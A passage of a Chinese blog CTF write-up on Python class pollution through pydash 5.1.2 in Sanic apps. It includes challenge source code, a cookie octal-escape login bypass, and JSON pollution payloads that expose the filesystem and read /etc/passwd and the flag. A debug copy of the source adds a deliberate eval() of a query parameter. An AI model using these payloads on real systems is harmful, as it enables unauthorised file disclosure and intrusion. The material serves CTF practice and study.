class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在<code>/admin</code>处存在污染(pydash&#x3D;&#x3D;5.1.2), 不过我们需要</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>所以要先完成<code>/login</code>里的登录操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br></pre></td></tr></table></figure><p>但在cookie中<code>;</code>是分割符号</p><p>sanic在处理 Cookie时, 对八进制是有转换的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728171506324.png" alt="image-20240728171506324"></p><p>因此这里可以使用八进制绕过</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727175702072.png" alt="image-20240727175702072"></p><p>接下来就是污染<code>__file__</code>这个全局变量, 他在<code>/src</code>路由下被使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br></pre></td></tr></table></figure><p><code>_.</code>被ban了, 这里需要看一下pydash的源码, 我们跟进<code>_set</code>方法一直到<code>update_with</code>, 这里时真正进行merge的地方</p><p>选中参数path往下翻会发现</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728172719311.png" alt="image-20240728172719311"></p><p><code>to_path_tokens</code>对path进行了解析, 我们跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728172917613.png" alt="image-20240728172917613"></p><p>有一个名为<code>RE_PATH_KEY_DELIM</code>的正则对其进行了过滤</p><p>点进去, 这个正则是这样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RE_PATH_KEY_DELIM = re.<span class="built_in">compile</span>(<span class="string">r&quot;(?&lt;!\\)(?:\\\\)*\.|(\[\d+\])&quot;</span>)</span><br></pre></td></tr></table></figure><p>大概意思是 用偶数个<code>/</code>加上<code>.</code>来分割字符串, 并且匹配<code>[数字]</code></p><p>理论上来说我们加上<code>\\</code>就可以, 但是这里调试了半天, <code>\\</code>并不会被忽略导致第一个key和第二个连在一起了,</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728213148221.png" alt="image-20240728213148221"></p><p> 我们单把这个正则从推导式中拿出来又能正确分割</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728213402968.png" alt="image-20240728213402968"></p><p>感觉这里是推导式的锅, 我们还是老实用大佬的poc:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__init__\\\\.__globals__</span><br></pre></td></tr></table></figure><p>这样我们就可以读取任意文件了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;.__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;:&quot;/etc/passwd&quot;&#125;</span><br></pre></td></tr></table></figure><p>但是flag的位置不得而知,  正常思路我们需要再找到一个能够遍历目录的点</p><p>大概扫一眼, 也就这个位置和目录有点关系了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br></pre></td></tr></table></figure><p>这里的app.static创建了一个静态文件路由<code>/static/</code>使得客户端能够访问到.&#x2F;static&#x2F;路径下的静态文件</p><p>我们去方法里面看看</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727221812455.png" alt="image-20240727221812455"></p><p>可以看见这个方法中有很多的参数, 下面还有一大段的注释</p><p>重点关注directory_view 和 directory_handler这两个参数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727221932012.png" alt="image-20240727221932012"></p><p>directory_view 理解起来比较简单, 当它为True时, 访问对应路由时会展示目录下的文件及子目录</p><p>例如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>, directory_view=<span class="literal">True</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727223020832.png" alt="image-20240727223020832"></p><p>正常不加参数directory_view&#x3D;True这里是会返回500错误的</p><p>而directory_handler是一个对象, 它负责处理客户端对目录的请求, 题目中是没有指定directory_handler的, 在app.static方法中, 没有指定directory_handler时, 默认会这样处理</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727223438442.png" alt="image-20240727223438442"></p><p>这里创建了一个Directory_handler, 跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727223806677.png" alt="image-20240727223806677"></p><p>这样看来我们只需要把static创建的这个Directory_handler对象的directory污染为根目录, directory_view污染为True即可</p><p>如何获取到Directory_handler对象?</p><p>首先需要明确一点, 一条路由的handler, 肯定是存在于这个路由的实例的上下文中的, 那么我们首先要得到这个路由的实例</p><p>这里有两种方法来获取全部路由实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.router.name_index</span><br><span class="line">输出:</span><br><span class="line">&#123;&#x27;__mp_main__.static&#x27;: &lt;Route: name=__mp_main__.static path=static/&lt;__file_uri__:path&gt;&gt;, &#x27;__mp_main__.index&#x27;: &lt;Route: name=__mp_main__.index path=/&gt;, &#x27;__mp_main__.login&#x27;: &lt;Route: name=__mp_main__.login path=login&gt;, &#x27;__mp_main__.src&#x27;: &lt;Route: name=__mp_main__.src path=src&gt;, &#x27;__mp_main__.admin&#x27;: &lt;Route: name=__mp_main__.admin path=admin&gt;&#125;</span><br><span class="line"></span><br><span class="line">app.router.routes_all</span><br><span class="line">输出:</span><br><span class="line">&#123;(&#x27;&#x27;,): &lt;Route: name=__mp_main__.index path=/&gt;, (&#x27;login&#x27;,): &lt;Route: name=__mp_main__.login path=login&gt;, (&#x27;src&#x27;,): &lt;Route: name=__mp_main__.src path=src&gt;, (&#x27;admin&#x27;,): &lt;Route: name=__mp_main__.admin path=admin&gt;, (&#x27;static&#x27;, &#x27;&lt;__file_uri__:path&gt;&#x27;): &lt;Route: name=__mp_main__.static path=static/&lt;__file_uri__:path&gt;&gt;&#125;</span><br></pre></td></tr></table></figure><p>他们都是dict类型的, 因此我们可以这样得到路由实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.router.name_index[&#x27;__mp_main__.static&#x27;]</span><br><span class="line"></span><br><span class="line">app.router.routes_all[(&#x27;static&#x27;, &#x27;&lt;__file_uri__:path&gt;&#x27;)]</span><br></pre></td></tr></table></figure><p>接下来如何调用它的DirectoryHandler呢? </p><p>直接全局搜索name_index和routes_all</p><p>这个routes_all实际上是一个函数, 那么就没法用了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728001822973.png" alt="image-20240728001822973"></p><p>name_index有好几处调用, 我们在这里打上断点</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728003504702.png" alt="image-20240728003504702"></p><p>运行就能看见</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728003933038.png" alt="image-20240728003933038"></p><p>这样就确定了DirectoryHandler的位置 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.router.name_index[%27__mp_main__.static%27].handler.keywords[%27directory_handler%27]</span><br></pre></td></tr></table></figure><p>我们用gxn师傅的方法, 修改一下源码方便调试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="built_in">eval</span>(request.args.get(<span class="string">&#x27;nacl&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728162040504.png" alt="image-20240728162040504"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728162049375.png" alt="image-20240728162049375"></p><p>污染directory_view</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>再次查看为true</p><p>接下来是污染Directory_handler对象的directory属性</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728214109204.png" alt="image-20240728214109204"></p><p>需要注意的是这仍然是一个对象而不是一个字符串</p><p>可以看见directory下面有一个parts元组, 它的值与directory这个Path是对应的, 那么我们去看看这个parts做了什么</p><p>回到最开始的stastic函数中</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728214444103.png" alt="image-20240728214444103"></p><p>打断点跟进去</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728215020285.png" alt="image-20240728215020285"></p><p>跟进<code>_from_parts</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728220152259.png" alt="image-20240728220152259"></p><p>发现parts是被赋值给了<code>_parts</code>属性, 并且这是一个list, 可以被污染</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728221045713.png" alt="image-20240728221045713"></p><p>那么, 拿着这两个payload污染后访问&#x2F;static&#x2F;就可以看见flag了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728221559984.png" alt="image-20240728221559984"></p><p>之后再污染<code>__file__</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;.__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;/24bcbd0192e591d6ded1_flag&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>访问<code>/src</code>得到flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728222036306.png" alt="image-20240728222036306"></p><h2 id="Sanic’s-revenge"><a href="#Sanic’s-revenge" class="headerlink" title="Sanic’s revenge"></a>Sanic’s revenge</h2><p>题目给了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的源码好像被admin删掉了一些，听他说里面藏有大秘密</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/*****secret********&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    secret=<span class="string">&#x27;**************************&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;can you find my route name ???&quot;</span>+secret)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment"># 生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="comment"># 备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;从Sanic到Sanic’s-revenge&quot;&gt;&lt;a href=&quot;#从Sanic到Sanic’s-revenge&quot; class=&quot;headerlink&quot; title=&quot;从Sanic到Sanic’s revenge&quot;&gt;&lt;/a&gt;从Sanic到Sanic’s reven</summary>
      
    
    
    
    
    <category term="Python原型链污染(类污染)" scheme="http://example.com/tags/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-%E7%B1%BB%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>Shiro反序列化</title>
    <link href="http://example.com/2024/07/25/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/07/25/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-07-25T11:46:37.000Z</published>
    <updated>2024-08-23T13:10:06.119Z</updated>
    
